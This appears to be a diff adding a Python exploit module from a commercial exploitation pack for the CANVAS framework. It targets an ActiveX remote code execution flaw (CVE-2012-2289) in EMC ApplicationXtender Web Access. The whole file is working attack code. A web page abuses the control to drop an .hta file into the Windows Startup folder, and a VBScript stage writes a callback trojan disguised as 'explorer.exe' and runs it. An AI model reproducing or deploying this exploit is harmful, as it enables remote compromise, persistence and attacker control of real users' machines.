@@ -1,0 +1,225 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import urllib
+import struct
+
+# GUI info
+NAME = "EMC ApplicationXtender Web Access .NET Viewer ActiveX Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in EMC ApplicationXtender Web Access .NET Viewer ActiveX"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "EMC"
+DOCUMENTATION["Date public"] = "2012.08.29"
+DOCUMENTATION["VersionsAffected"] = "EMC ApplicationXtender Web Access .NET < 6.5 SP2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-12-182/"
+DOCUMENTATION["CVE Name"] = "CVE-2012-2289"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2289"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_emcaxwa -l 192.168.1.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        self.aexname = "d2.aex" 
+        self.imagename = "d2.gif" 
+        self.scriptname = "d.vbs"              
+        return
+
+
+    def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+				  d = "0d"
+				elif b == "\n":
+				  d = "0a"
+				elif b == "\0":
+				  d = "00"
+				else:
+				  c = hex(ord(b))
+				  d = c.replace("0x", "")
+				
+				if len(d) == 1:
+				  d = "0"+d
+				
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+		
+		hta = "function d2()\n"
+		while 1:
+		  hta += " prog = prog & \""
+		
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+		
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+		
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"		
+		hta += "End function\n"		
+		return hta 
+
+
+    def maketrojan(self):		
+		t_os = canvasos("Windows")
+		t_os.arch = "X86"    
+		self.buildmosdeftrojan(self.callback.ip, self.callback.port, http=True, target_os = t_os)                
+		self.htafile = self.file4hta(self.mosdeftrojan)
+		
+    		        
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("WxSuperControl.ViewControl.3");
+	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:904943B2-8056-4747-84C7-A8C3DCFF825E' id='target'>";	
+			          
+    target.DisplayImageFile("IMAGEURL");
+    target.AnnoLoad("AEXURL");
+    target.AnnoSave("C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\d2.hta");    
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>            
+"""
+        filedata = filedata.replace("IMAGEURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.imagename)        
+        filedata = filedata.replace("AEXURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.aexname)        
+
+        if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+	
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()                     
+                
+        if clientheader.URL.count(self.filename):            
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)      
+        elif clientheader.URL.count(self.aexname):
+            self.maketrojan()   
+            self.log("Sending AEX file")
+            script = "<SCRIPT language=vbs src="+ "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.scriptname +"></SCRIPT><SCRIPT>d2()</SCRIPT>"
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(script)          
+        elif clientheader.URL.count(self.scriptname):               
+            self.log("Sending VBScript file")            
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")            
+            b.setBody(self.htafile)                         
+        elif clientheader.URL.count(self.imagename):               
+            self.log("Sending IMAGE file")
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_emcaxwa/" + self.imagename, "rb")
+            image = f.read()
+            f.close()            
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(image)                                    
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+    
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
